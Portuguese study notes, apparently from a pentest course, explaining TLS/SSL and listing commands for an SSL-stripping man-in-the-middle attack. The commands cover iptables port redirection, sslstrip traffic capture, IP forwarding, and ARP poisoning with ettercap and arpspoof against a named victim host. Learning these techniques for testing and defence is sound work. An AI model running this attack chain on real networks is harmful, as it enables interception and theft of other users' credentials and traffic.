Protocolos:
- TLS: Transport Layer Security é um protocolo de segurança
de rede usado para criptografar e transmitir dados HTTP e IPP
(Internet Printing Protocol) por rede TCP/IP (Baseado nos SSLs anteriores)
- SSL: Secure Sockets Layer(carrega pagina mais devagar), fornece segurança para email(SMTP),
 HTTPS, e outros tipos de transferencias de dados.

Deixando de aplicar o SSL e começando a usar o TSL.


Foram criados para mitigar ataques man in the middle.
Quebrar esses tipos de protocolo é impossivel hoje, mas da pra obter a informação de outra forma.
TLS/SSL - Comunicação web.

TCP -> TLS -> HTTP

SSL striping - Quebrar a comunicação entre duas maquinas, e funciona juntamente com o arpspoofing.
 
Comandos:

- ifconfig
- service ssh start
- iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# nat: Comunicação com a parte interna e externa da rede
#POSTROUTING: pega o pacote e analisa e encaminha
#PREROUTING: Não passa pelo processamento, ele só pega o pacote e encaminha
#-p tcp: protocolo
#--destination-port 80 : porta de destino original
#-j REDIRECT --to-port 10000: redirecionado para a porta 10000

-iptables -t nat -L
- sslstrip -h 
- sslstrip -w capture.txt
Flip your machine into forwarding mode (as root):
	   echo "1" > /proc/sys/net/ipv4/ip_forward

-ettercap -G (Para iniciar a ettercap)
Ver lista de host no ettercap
Seleciona ARP Poisoning:
- Sniff remote connections


Outros metodos:

Comandos:
Trafego de saida:
- arpspoof -i eth0 -t 192.168.0.1 192.168.0.12
Trafego de entrada:
- arpspoof -i eth0 -t 192.168.0.12 192.168.0.1
# 192.168.0.1 : target roteador
# 192.168.0.12 : alvo(vitima)

SSLStrip, ataque man in the middle com sites com SSL/TLS
- Utiliza por padrão a porta 10.000

Diferença entre ethercap e Arpspoof.
- Um mostra os dados e o outro não

Abrir Burpsuite e explorar
